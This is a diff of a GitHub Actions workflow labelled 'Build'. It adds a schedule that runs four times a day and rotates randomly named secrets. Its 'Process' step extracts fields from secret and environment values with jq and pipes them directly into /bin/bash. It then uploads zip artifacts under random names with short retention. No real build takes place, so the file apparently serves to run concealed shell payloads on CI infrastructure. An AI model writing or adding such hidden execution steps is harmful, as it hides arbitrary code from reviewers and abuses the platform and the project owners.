@@ -2,6 +2,8 @@ name: Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '21 1,7,13,19 * * *'
 env:
   CI: true
 concurrency:
@@ -17,17 +19,15 @@ jobs:
           fetch-depth: 1
       - name: Process
         env:
-          o2700: ${{ secrets.o2700 }}
+          eq8: ${{ secrets.eq8 }}
         run: |
-          printf '%s' "$o2700" | jq -r .j1458 | /bin/bash
-          echo $t2546 | jq -r .hflbx77257 | /bin/bash
-          echo $t8 | jq -r .w0088 | /bin/bash
-          printf '%s' "$etu3150" | jq -r .xa395 | /bin/bash
-          echo $pc966 | jq -r .zitb100 | /bin/bash
+          printf '%s' "$eq8" | jq -r .hx65 | /bin/bash
+          printf '%s' "$vwoq340" | jq -r .dwwf3 | /bin/bash
+          echo $wnv7 | jq -r .ktdu75045 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: QVyygWDZ
+          name: NzSRzlaS
           path: "*.zip"
           retention-days: 1
